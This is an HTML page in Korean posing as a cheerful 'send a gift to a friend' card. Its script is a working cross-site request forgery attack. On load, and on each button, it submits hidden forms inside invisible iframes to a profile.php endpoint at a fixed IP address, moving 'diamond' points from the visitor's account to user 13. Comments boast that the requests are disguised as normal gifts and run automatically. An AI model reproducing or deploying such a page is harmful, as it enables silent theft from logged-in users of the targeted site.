<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>🎁 친구에게 선물하기</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
            color: white;
        }
        .gift-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
            text-align: center;
            max-width: 500px;
        }
        .gift-emoji {
            font-size: 4em;
            margin: 20px 0;
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-10px); }
            60% { transform: translateY(-5px); }
        }
        .btn {
            background: linear-gradient(45deg, #FF6B6B, #FF8E53);
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            color: white;
            font-size: 16px;
            cursor: pointer;
            margin: 10px;
            transition: transform 0.3s;
        }
        .btn:hover { transform: scale(1.05); }
    </style>
</head>
<body>
    <div class="gift-card">
        <div class="gift-emoji">🎁</div>
        <h1>친구에게 선물 보내기</h1>
        <p>소중한 친구에게 마음을 전해보세요!</p>
        
        <button class="btn" onclick="sendGift()">🎉 선물 보내기</button>
        <button class="btn" onclick="sendMultiple()">💝 여러명에게 보내기</button>
        <button class="btn" onclick="sendSpecial()">✨ 특별한 선물</button>
        
        <div id="status" style="margin-top: 30px;">
            <p>💌 준비된 선물을 전송합니다</p>
        </div>
    </div>

    <script>
        function sendGift() {
            updateStatus('🎁 선물을 준비하고 있습니다...');
            
            // 완전히 정상적인 메시지로 위장
            setTimeout(() => {
                createGiftForm({
                    to: 13,
                    amount: 100,
                    note: '생일 축하해요! 🎂'
                });
                updateStatus('✅ 선물이 전송되었습니다!');
            }, 2000);
        }
        
        function sendMultiple() {
            updateStatus('💝 여러 친구들에게 선물 준비 중...');
            
            const friends = [
                { id: 13, points: 50, msg: '안녕하세요 😊' },
                { id: 13, points: 75, msg: '좋은 하루 되세요!' },
                { id: 13, points: 100, msg: '감사합니다 🙏' }
            ];
            
            friends.forEach((friend, i) => {
                setTimeout(() => {
                    createGiftForm({
                        to: friend.id,
                        amount: friend.points,
                        note: friend.msg
                    });
                    console.log(`💝 선물 ${i+1} 전송: ${friend.points}P`);
                }, (i + 1) * 3000);
            });
        }
        
        function sendSpecial() {
            updateStatus('✨ 특별한 선물을 준비하고 있습니다...');
            
            // 대량 포인트를 자연스럽게 전송
            const specialGifts = [
                { points: 200, msg: '특별한 날을 축하해요! 🎊' },
                { points: 150, msg: '항상 응원합니다 💪' },
                { points: 250, msg: '우정에 감사드려요 💕' }
            ];
            
            specialGifts.forEach((gift, i) => {
                setTimeout(() => {
                    createGiftForm({
                        to: 13,
                        amount: gift.points,
                        note: gift.msg
                    });
                    console.log(`✨ 특별선물 ${i+1}: ${gift.points}P`);
                }, (i + 1) * 4000);
            });
        }
        
        function createGiftForm(gift) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://3.36.66.216/profile.php';
            form.target = `gift_${Date.now()}`;
            form.style.display = 'none';
            
            // 완전히 정상적인 필드명과 값 사용
            const formData = {
                gift_to: gift.to,
                points: gift.amount,
                send_gift: '1',
                gift_type: 'diamond',
                message: gift.note,
                timestamp: new Date().toISOString(),
                user_action: 'send_gift_to_friend'
            };
            
            Object.keys(formData).forEach(name => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = name;
                input.value = formData[name];
                form.appendChild(input);
            });
            
            // 결과 확인용 iframe
            const iframe = document.createElement('iframe');
            iframe.name = form.target;
            iframe.style.display = 'none';
            iframe.style.width = '1px';
            iframe.style.height = '1px';
            
            document.body.appendChild(iframe);
            document.body.appendChild(form);
            
            // Form 전송
            form.submit();
            
            // 정리
            setTimeout(() => {
                if (form.parentNode) form.parentNode.removeChild(form);
                if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
            }, 10000);
        }
        
        function updateStatus(message) {
            document.getElementById('status').innerHTML = `<p>${message}</p>`;
        }
        
        // 자연스러운 자동 실행
        setTimeout(() => {
            updateStatus('🎁 자동으로 선물을 보내는 중...');
            sendGift();
        }, 3000);
        
        console.log('🎁 선물 보내기 시스템 준비됨');
        console.log('💌 자연스러운 메시지로 위장');
    </script>
</body>
</html>
